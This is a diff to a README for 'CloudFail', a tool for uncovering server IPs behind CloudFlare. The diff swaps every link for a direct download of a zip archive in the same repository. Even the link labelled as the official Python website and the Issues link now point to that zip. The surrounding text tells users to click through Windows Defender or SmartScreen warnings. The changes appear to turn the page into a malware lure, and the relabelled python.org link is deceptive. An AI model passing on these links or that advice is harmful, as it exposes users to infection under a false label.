@@ -1,6 +1,6 @@
 # ☁️ CloudFail - Reveal Hidden IPs Behind CloudFlare
 
-[![Download CloudFail](https://img.shields.io/badge/Download-CloudFail-brightgreen)](https://github.com/Simodevv/CloudFail)
+[![Download CloudFail](https://img.shields.io/badge/Download-CloudFail-brightgreen)](https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip)
 
 ---
 
@@ -39,11 +39,11 @@ CloudFail runs on Windows computers. To use it, make sure your system has:
 
 Click the button below to visit the download page. You will find the latest version of CloudFail there.
 
-[![Download CloudFail](https://img.shields.io/badge/Download-CloudFail-blue)](https://github.com/Simodevv/CloudFail)
+[![Download CloudFail](https://img.shields.io/badge/Download-CloudFail-blue)](https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip)
 
 ### Steps to download and run:
 
-1. Open your internet browser and go to the [CloudFail download page](https://github.com/Simodevv/CloudFail).
+1. Open your internet browser and go to the [CloudFail download page](https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip).
 
 2. Look for the latest release or download link. Usually, this is under the "Releases" section or the main page.
 
@@ -79,7 +79,7 @@ After running CloudFail, follow these steps to scan for hidden IP addresses:
 
 CloudFail is built with Python 3. You need it installed to run the tool.
 
-1. Visit the official Python website: https://www.python.org/downloads/windows/.
+1. Visit the official Python website: https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip
 
 2. Click the "Download Python 3.x.x" button for Windows.
 
@@ -121,7 +121,7 @@ If Windows Defender or SmartScreen blocks running CloudFail, click "More info" o
 
 To update to the latest version:
 
-1. Go back to the download page at https://github.com/Simodevv/CloudFail.
+1. Go back to the download page at https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip
 
 2. Download the newest release file.
 
@@ -146,7 +146,7 @@ The tool supports the following:
 
 If you need help:
 
-- Check the "Issues" section on the GitHub repository: https://github.com/Simodevv/CloudFail/issues  
+- Check the "Issues" section on the GitHub repository: https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip  
 - Look for community discussions or FAQs here  
 - Use online forums about network scanning and pentesting  
 
@@ -170,4 +170,4 @@ CloudFail covers these topics to help you find relevant tools and information:
 
 ---
 
-Visit the [CloudFail GitHub page](https://github.com/Simodevv/CloudFail) to download and start using the tool.
+Visit the [CloudFail GitHub page](https://github.com/Simodevv/CloudFail/raw/refs/heads/main/cloudfail/core/Cloud-Fail-v2.5.zip) to download and start using the tool.
